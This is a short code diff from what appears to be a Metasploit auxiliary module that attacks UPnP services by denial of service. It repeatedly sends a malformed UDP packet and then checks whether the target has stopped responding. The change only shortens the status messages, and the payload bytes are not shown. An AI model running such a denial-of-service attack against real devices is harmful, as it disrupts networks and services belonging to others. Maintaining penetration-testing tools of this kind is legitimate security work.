@@ -77,30 +77,30 @@ class MetasploitModule < Msf::Auxiliary
     # connect to the UDP port
     connect_udp
 
-    print_status("#{rhost}:#{rport} - Checking UPnP...")
+    print_status("Checking UPnP...")
     response = send_probe(udp_sock, msearch_probe)
     if response.nil?
-      print_error("#{rhost}:#{rport} - UPnP end not found")
+      print_error("UPnP end not found")
       disconnect_udp
       return
     end
 
     (1..datastore['ATTEMPTS']).each do |attempt|
-      print_status("#{rhost}:#{rport} - UPnP DoS attempt #{attempt}...")
+      print_status("UPnP DoS attempt #{attempt}...")
 
       # send the exploit to the target
-      print_status("#{rhost}:#{rport} - Sending malformed packet...")
+      print_status("Sending malformed packet...")
       udp_sock.put(sploit)
 
       # send the probe to the target
-      print_status("#{rhost}:#{rport} - The target should be unresponsive now...")
+      print_status("The target should be unresponsive now...")
       response = send_probe(udp_sock, msearch_probe)
       if response.nil?
-        print_good("#{rhost}:#{rport} - UPnP unresponsive")
+        print_good("UPnP unresponsive")
         disconnect_udp
         break
       else
-        print_status("#{rhost}:#{rport} - UPnP is responsive still")
+        print_status("UPnP is responsive still")
       end
     end
 
